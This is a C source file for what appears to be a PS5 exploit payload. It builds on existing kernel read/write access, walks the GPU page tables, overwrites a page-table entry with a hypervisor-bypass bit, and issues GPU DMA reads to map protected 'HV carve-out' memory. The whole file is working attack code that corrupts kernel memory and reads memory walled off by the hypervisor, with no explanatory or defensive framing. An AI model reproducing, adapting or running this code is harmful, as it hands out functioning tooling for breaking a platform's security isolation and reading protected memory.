/* probe90/sweep.elf — single-read layout map of the HV carve-out via 8KB leaves + bit50.
 * For each 8KB chunk, report distinct-byte count (256 = ciphertext/encrypted page,
 * 1 = uniform/zero page) + the first 8 bytes. Fast (one read per chunk), no temporal diff.
 * Log: /data/kex_sweep.txt   Config: /data/gpread90_cfg.txt (base hex, nchunks dec)
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <ps5/kernel.h>
#include <ps5/payload.h>

extern const intptr_t KERNEL_ADDRESS_DMAP_BASE;

#define PROT_GPU_READ   0x10
#define PROT_GPU_WRITE  0x20
#define MAP_NO_COALESCE 0x00400000u
#define DMEM_TYPE_GARLIC 0xb
#define DMEM_RANGE_END   0x400000000ull

#define GPU_PDE_VALID   0x1ull
#define GPU_PDE_IS_PTE  (1ull << 54)
#define GPU_PDE_TF      (1ull << 56)
#define GPU_PDE_BIT50   (1ull << 50)
#define GPU_ADDR_MASK   0x0000FFFFFFFFFFC0ull
#define GPU_ADDR_8K_MASK 0x0000FFFFFFFFE000ull

#define GVMSPACE_SIZE        0x100
#define GVMSPACE_PAGE_DIR_VA 0x38
#define DATA_BASE_GVMSPACE   0x2EEA570u

#define GPU_SUBMIT_IOCTL    0xC0108102u
#define PM4_TYPE3           3u
#define PM4_OPCODE_DMA_DATA 0x50u
#define PM4_SHADER_COMPUTE  1u

#define CPU_PG_V     0x001ull
#define CPU_PG_FRAME 0x000FFFFFFFFFF000ull
#define RAM_MAX      0x400000000ull

#define OFFSET_KERNEL_PMAP_STORE 0x28c84a8ull

#define SEG_BASE_DEF 0x3fd00000ull
#define NCHUNK_DEF   128

static int      g_logfd = -1;
static uint64_t g_dmap;

static void logline(const char *m){ if(g_logfd>=0){write(g_logfd,m,strlen(m));write(g_logfd,"\n",1);fsync(g_logfd);} printf("%s\n",m); }

typedef int (*fn_alloc_dmem)(off_t, off_t, size_t, size_t, int, off_t *);
typedef int (*fn_map_dmem)(void **, size_t, int, int, off_t, size_t);
typedef int (*fn_release_dmem)(off_t, size_t);
static fn_alloc_dmem   p_AllocateDirectMemory;
static fn_map_dmem     p_MapDirectMemory;
static fn_release_dmem p_ReleaseDirectMemory;

static int read_phys(uint64_t pa, uint64_t *out){ if(pa>=RAM_MAX) return -1; return kernel_copyout((intptr_t)(g_dmap+pa), out, 8)==0; }

typedef struct { uint64_t gva, phys, pte_pa, raw; int is_2m; } leaf_t;
#define MAX_LEAVES 65536
static leaf_t leaves[MAX_LEAVES];
static int     nleaves = 0;

static void add_leaf(uint64_t gva,uint64_t phys,uint64_t pte_pa,uint64_t raw,int is_2m){
  if(nleaves<MAX_LEAVES){leaves[nleaves].gva=gva;leaves[nleaves].phys=phys;leaves[nleaves].pte_pa=pte_pa;leaves[nleaves].raw=raw;leaves[nleaves].is_2m=is_2m;}
  nleaves++;
}
static void walk_vmid(intptr_t gvmspace_base,int vmid){
  uint64_t page_dir_va=kernel_getlong(gvmspace_base+(intptr_t)vmid*GVMSPACE_SIZE+GVMSPACE_PAGE_DIR_VA);
  if(!page_dir_va) return;
  for(int i4=0;i4<512;i4++){
    uint64_t pml4e;
    if(kernel_copyout((intptr_t)(page_dir_va+i4*8),&pml4e,8)!=0||!(pml4e&GPU_PDE_VALID)) continue;
    uint64_t pdpt_pa=pml4e&GPU_ADDR_MASK;
    for(int i3=0;i3<512;i3++){
      uint64_t pdpe;
      if(!read_phys(pdpt_pa+i3*8,&pdpe)||!(pdpe&GPU_PDE_VALID)) continue;
      uint64_t pd_pa=pdpe&GPU_ADDR_MASK;
      for(int i2=0;i2<512;i2++){
        uint64_t pde;
        if(!read_phys(pd_pa+i2*8,&pde)||!(pde&GPU_PDE_VALID)) continue;
        uint64_t gva2=((uint64_t)i4<<39)|((uint64_t)i3<<30)|((uint64_t)i2<<21);
        if(pde&GPU_PDE_IS_PTE){ add_leaf(gva2,pde&GPU_ADDR_MASK,pd_pa+i2*8,pde,1); }
        else {
          uint64_t frag=(pde>>59)&0x1F, ptb_pa=pde&GPU_ADDR_MASK;
          for(int i1=0;i1<256;i1++){
            uint64_t pte;
            if(!read_phys(ptb_pa+i1*8,&pte)||!(pte&GPU_PDE_VALID)) continue;
            if((pte&GPU_PDE_TF)&&frag==4){
              uint64_t subtab=pte&GPU_ADDR_MASK;
              for(int i1b=0;i1b<8;i1b++){
                uint64_t leaf;
                if(!read_phys(subtab+i1b*8,&leaf)||!(leaf&GPU_PDE_VALID)) continue;
                add_leaf(gva2|((uint64_t)i1<<16)|((uint64_t)i1b<<13),leaf&GPU_ADDR_8K_MASK,subtab+i1b*8,leaf,0);
              }
            } else {
              uint64_t shift=(frag==1)?13:16;
              add_leaf(gva2|((uint64_t)i1<<shift),pte&GPU_ADDR_MASK,ptb_pa+i1*8,pte,0);
            }
          }
        }
      }
    }
  }
}

static void build_dma_data(uint32_t *pkt,uint64_t src,uint64_t dst,uint32_t len){
  pkt[0]=((PM4_TYPE3&3u)<<30)|((5u&0x3FFFu)<<16)|((PM4_OPCODE_DMA_DATA&0xFFu)<<8)|((PM4_SHADER_COMPUTE&1u)<<1);
  pkt[1]=(1u<<31)|(2u<<25)|(1u<<27)|(2u<<13)|(1u<<15);
  pkt[2]=(uint32_t)(src&0xFFFFFFFFull); pkt[3]=(uint32_t)(src>>32);
  pkt[4]=(uint32_t)(dst&0xFFFFFFFFull); pkt[5]=(uint32_t)(dst>>32);
  pkt[6]=len&0x1FFFFFu;
}
static void build_desc(uint64_t *d,uint64_t cmd_gpu_va,uint32_t dword_count){
  d[0]=((cmd_gpu_va&0xFFFFFFFFull)<<32)|0xC0023F00ull;
  d[1]=(((uint64_t)(dword_count&0xFFFFFu))<<32)|((cmd_gpu_va>>32)&0xFFFFull);
}
struct gc_submit { uint32_t pipe_id; uint32_t count; uint64_t cmd_buf_ptr; };

static int submit_read(int gc,uint8_t *cmd_va,uint64_t cmd_gva,uint64_t src_gva,uint64_t dst_gva,uint32_t len){
  memset(cmd_va,0,0x100+0x10);
  build_dma_data((uint32_t*)cmd_va,src_gva,dst_gva,len);
  build_desc((uint64_t*)(cmd_va+0x100),cmd_gva,7);
  struct gc_submit sub={0,1,(uint64_t)(uintptr_t)(cmd_va+0x100)};
  int r=ioctl(gc,GPU_SUBMIT_IOCTL,&sub);
  usleep(150*1000);
  return r;
}

int main(void){
  g_logfd=open("/data/kex_sweep.txt",O_WRONLY|O_CREAT|O_TRUNC|O_SYNC,0666);
  g_dmap=(uint64_t)(uintptr_t)KERNEL_ADDRESS_DMAP_BASE;
  char b[400];
  intptr_t kb=payload_get_args()->kdata_base_addr;

  p_AllocateDirectMemory=(fn_alloc_dmem)dlsym(RTLD_DEFAULT,"sceKernelAllocateDirectMemory");
  p_MapDirectMemory=(fn_map_dmem)dlsym(RTLD_DEFAULT,"sceKernelMapDirectMemory");
  p_ReleaseDirectMemory=(fn_release_dmem)dlsym(RTLD_DEFAULT,"sceKernelReleaseDirectMemory");
  if(!p_AllocateDirectMemory||!p_MapDirectMemory){ logline("FAIL: resolve"); return 1; }

  uint64_t seg_base=SEG_BASE_DEF; int nchunks=NCHUNK_DEF;
  { int fd=open("/data/gpread90_cfg.txt",O_RDONLY);
    if(fd>=0){ char buf[128]={0}; ssize_t r=read(fd,buf,sizeof buf-1); if(r>0){ char *nl=strchr(buf,'\n');
      seg_base=strtoull(buf,NULL,16); if(nl){ int c=strtol(nl+1,NULL,10); if(c>0&&c<=512) nchunks=c; } } close(fd); } }

  snprintf(b,sizeof b,"sweep: kdata=0x%llx fw=0x%x base=0x%llx nchunks=%d",(unsigned long long)kb,kernel_get_fw_version(),(unsigned long long)seg_base,nchunks);
  logline(b);

  int gc=open("/dev/gc",O_RDWR); if(gc<0) gc=open("/dev/gc0",O_RDWR);
  if(gc<0){ logline("FAIL: no /dev/gc"); return 1; }

  const size_t SZ=0x10000;
  int prot=PROT_READ|PROT_WRITE|PROT_GPU_READ|PROT_GPU_WRITE;
  int NBUF=nchunks+2, STAGING=nchunks, CMD=nchunks+1;
  void **gva=calloc(NBUF,sizeof(void*)); off_t *goff=calloc(NBUF,sizeof(off_t));
  for(int i=0;i<NBUF;i++){
    if(p_AllocateDirectMemory(0,DMEM_RANGE_END,SZ,SZ,DMEM_TYPE_GARLIC,&goff[i])!=0||
       p_MapDirectMemory(&gva[i],SZ,prot,MAP_NO_COALESCE,goff[i],SZ)!=0){
      snprintf(b,sizeof b,"alloc/map fail idx %d",i); logline(b); return 1; }
  }
  uint64_t staging_gva=(uint64_t)(uintptr_t)gva[STAGING];
  uint64_t cmd_gva=(uint64_t)(uintptr_t)gva[CMD];

  intptr_t gvmspace_base=(intptr_t)kb+(intptr_t)DATA_BASE_GVMSPACE;
  int dev_vmid=-1;
  for(int vm=0;vm<16&&dev_vmid<0;vm++){
    nleaves=0; memset(leaves,0,sizeof leaves);
    walk_vmid(gvmspace_base,vm);
    int n=nleaves<MAX_LEAVES?nleaves:MAX_LEAVES;
    for(int i=0;i<n;i++) if(leaves[i].gva==(uint64_t)(uintptr_t)gva[0]){dev_vmid=vm;break;}
  }
  if(dev_vmid<0){ logline("FAIL: no dev vmid"); return 1; }

  nleaves=0; memset(leaves,0,sizeof leaves);
  walk_vmid(gvmspace_base,dev_vmid);
  int n=nleaves<MAX_LEAVES?nleaves:MAX_LEAVES;

  /* select one 8KB leaf per victim buffer (base leaf) */
  leaf_t *vleaf=calloc(nchunks,sizeof(leaf_t));
  for(int i=0;i<n;i++){
    if(leaves[i].is_2m) continue;
    for(int k=0;k<nchunks;k++) if(!vleaf[k].raw && leaves[i].gva==(uint64_t)(uintptr_t)gva[k]){ vleaf[k]=leaves[i]; break; }
  }

  uint64_t zero_base=0;
  for(int k=0;k<nchunks;k++){
    if(!vleaf[k].raw){ snprintf(b,sizeof b,"chunk %d: no 8KB leaf",k); logline(b); continue; }
    leaf_t *v=&vleaf[k];
    uint64_t base=seg_base+(uint64_t)k*0x2000;
    uint64_t nw=(v->raw&~GPU_ADDR_8K_MASK)|(base&GPU_ADDR_8K_MASK)|GPU_PDE_BIT50;
    kernel_setlong((intptr_t)(g_dmap+v->pte_pa),nw);
    memset(gva[STAGING],0xA5,0x2000);
    submit_read(gc,(uint8_t*)gva[CMD],cmd_gva,v->gva,staging_gva,0x2000);
    kernel_setlong((intptr_t)(g_dmap+v->pte_pa),v->raw);

    uint8_t *p=(uint8_t*)gva[STAGING];
    uint64_t hist[256]={0}; int still_fill=1;
    for(uint32_t i=0;i<0x2000;i++){ hist[p[i]]++; if(p[i]!=0xA5) still_fill=0; }
    int distinct=0; for(int i=0;i<256;i++) if(hist[i]) distinct++;
    /* compress runs of the same classification */
    const char *cls = still_fill?"FILL":(distinct>=200?"CRYPT":(distinct<=4?"ZERO":"LOW"));
    if(!zero_base && cls[0]=='Z') zero_base=base;
    snprintf(b,sizeof b,"0x%llx %-5s distinct=%d/256 first=%02x%02x%02x%02x%02x%02x%02x%02x",
      (unsigned long long)base,cls,distinct,p[0],p[1],p[2],p[3],p[4],p[5],p[6],p[7]);
    logline(b);
  }

  close(gc);
  for(int i=0;i<NBUF;i++) p_ReleaseDirectMemory(goff[i],SZ);
  logline("done");
  return 0;
}
